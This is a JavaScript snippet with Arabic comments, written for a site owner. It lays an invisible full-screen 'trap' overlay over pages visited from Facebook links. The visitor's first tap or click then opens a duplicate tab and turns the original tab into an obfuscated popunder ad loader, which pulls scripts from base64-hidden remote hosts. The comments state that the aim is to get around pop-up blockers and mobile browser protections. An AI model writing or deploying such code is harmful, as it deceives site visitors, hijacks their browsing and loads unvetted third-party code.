(function() {
    // 1. الفلترة: العمل بالبراميتر فقط
    const urlParams = new URLSearchParams(window.location.search);
    if (!urlParams.has("fb_source")) return;

    function runMagic() {
        if (window._is_ad_fired) return;
        window._is_ad_fired = true;

        // --- التكتيك الخارق ---
        // أ. نفتح رابط موقعك الحالي في تبويب جديد (ليستمر الزائر في القراءة)
        // المتصفحات تسمح بهذا الفعل عند النقر/اللمس
        const currentUrl = window.location.href;
        const newTab = window.open(currentUrl, '_blank');

        if (newTab) {
            // ب. التبويب الأصلي (الذي نقر عليه المستخدم) نقوم بتحويله "فوراً" لسكربت البوب
            // هكذا نتجنب حظر Pop-up تماماً لأننا "نغير" الصفحة الحالية فقط
            injectAdsterraCode();
        }
    }

    function injectAdsterraCode() {
        /* كود Adsterra الرسمي الخاص بك */
        (function(){var x=window,m="e23f9a20a32bcb0e16cc092ebc328951",z=[["siteId",260-829*134*841-342+97961243],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],s=["d3d3LmludGVsbGlwb3B1cC5jb20vVGxjL3hmbG93dHlwZS5taW4uanM=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvTnZGL1BNL2diYXRtYW4ubWluLmNzcw=="],c=-1,o,w,d=function(){clearTimeout(w);c++;if(s[c]&&!(1801238139000<(new Date).getTime()&&1<c)){o=x.document.createElement("script");o.type="text/javascript";o.async=!0;var r=x.document.getElementsByTagName("script")[0];o.src="https://"+atob(s[c]);o.crossOrigin="anonymous";o.onerror=d;o.onload=function(){clearTimeout(w);};w=setTimeout(d,5E3);r.parentNode.insertBefore(o,r)}};if(!x[m]){try{Object.freeze(x[m]=z)}catch(e){}d()}})();
    }

    // 2. إنشاء الطبقة الشفافة "الفخ" فور تحميل الصفحة
    window.addEventListener('DOMContentLoaded', () => {
        const overlay = document.createElement('div');
        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:transparent;cursor:pointer;";
        document.body.appendChild(overlay);

        // التفعيل عند أول "لمسة حقيقية" (Touch) لضمان تجاوز حماية الموبايل
        overlay.addEventListener('touchstart', function() {
            runMagic();
            overlay.remove(); // إزالة الفخ ليعود الموقع طبيعياً في التبويب الجديد
        }, { once: true, passive: true });

        overlay.addEventListener('click', function() {
            runMagic();
            overlay.remove();
        }, { once: true });
    });

})();
